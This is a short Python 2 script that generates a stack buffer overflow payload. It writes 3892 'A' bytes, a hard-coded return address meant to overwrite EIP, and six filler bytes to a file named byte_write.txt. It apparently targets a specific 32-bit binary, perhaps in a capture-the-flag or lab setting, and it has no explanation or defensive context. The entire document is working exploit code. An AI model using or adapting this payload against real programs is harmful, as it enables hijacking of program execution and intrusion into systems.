#!/usr/bin/env python2
 

buff = "A" * 3892
eip = b"\x2b\x86\x04\x08"
offset = "C" * 6

buffer = buff + eip + offset

f = open("byte_write.txt", "w")
f.write(buffer+'\n')
f.close()

